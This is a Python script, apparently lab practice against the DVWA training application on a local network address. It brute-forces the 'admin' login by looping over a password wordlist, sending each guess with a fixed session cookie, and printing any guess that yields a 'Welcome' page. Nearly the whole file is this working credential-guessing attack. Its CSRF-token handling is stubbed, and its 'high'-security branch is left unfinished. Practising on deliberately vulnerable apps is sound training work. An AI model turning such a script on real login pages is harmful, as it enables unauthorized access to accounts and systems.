import requests
from bs4 import BeautifulSoup as bs

security = "low"
password_file = "/opt/fasttrack.txt"
with open(password_file, 'r') as f:
    passwords=f.readlines()

url_partial="http://192.168.1.163:8082/vulnerabilities/brute/"
url="http://192.168.1.163:8082/vulnerabilities/brute/"
cookies={
        'security' : security,
        'PHPSESSID' : 'hqkarbdj6vi8gn3gvier9m6qf7'
        }

def payload(passwords, crsftoken='#'):
  payload = []

  for password in passwords:
      payload.append({
                      'username': 'admin',
                      'password': password.strip(), 
                      'Login':'Login', 
                      'user_token':crsftoken
                      })
    #payload.append("?username=admin&password={}&Login=Login{}".format(password.rstrip(),crsftoken))


  return payload

def grabCRSFToken(r):
    soup = bs(r.content,'html.parser')
    return soup.findAll(attrs={"name" : "user_token"})[0].get('value')

def testPassword(payload,cookies):

    for i in payload:
      #url = url_partial + i.strip()
      #url = url_partial + i.strip()
      #r = requests.get(url, cookies=cookies)
      r = createSession(url, cookies, security, i)
      #r = requests.get(url, cookies=cookies, params=i)
      
      
#      if security != 'low':
#          grabCRSFToken(r)
#      else:
      
      if "Welcome" in r.text:
         #print(r.text)
         print(i)

def createSession(url,cookie,security,param):
      #r = requests.get(url, cookies=cookies, params=param)
    s = requests.Session()
    if security == 'high':
        pass
    else:
      r = s.get(url, cookies=cookies, params=param)
    return r

testPassword(payload(passwords), cookies)
